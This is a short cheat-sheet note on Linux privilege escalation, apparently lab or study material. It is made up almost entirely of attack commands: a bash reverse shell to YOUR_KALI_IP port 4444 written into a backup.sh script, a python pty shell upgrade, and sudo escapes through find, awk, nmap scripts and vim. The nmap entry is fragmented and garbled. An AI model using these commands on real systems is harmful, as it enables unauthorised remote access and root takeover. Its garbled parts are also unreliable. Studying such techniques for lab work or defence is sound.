---
title: Reverse Shell Techniques
category: linux-privilege-escalation
tags: [ks-import, reverse-shell, bash, sudo, privilege-escalation, linux]
source: linux prev/attack5.md
sourceId: 10023
---
> ```
> REVERSE SHELL
> ```
```
> echo '#!/bin/bash bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1' > /home/karen/backup.sh
```
```
chmod +x /home/karen/backup.sh
```

> ```
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> ```
> ```
> ==a. sudo find /bin -name nano -exec /bin/sh \;==
> ==b. sudo awk 'BEGIN {system("/bin/sh")}'==
> ==c. echo "==
> ==.execute('/bin/sh')" > shell.nse && sudo==
> ==--script=shell.nse==
> ==d. sudo vim -c '!sh'==
> ```
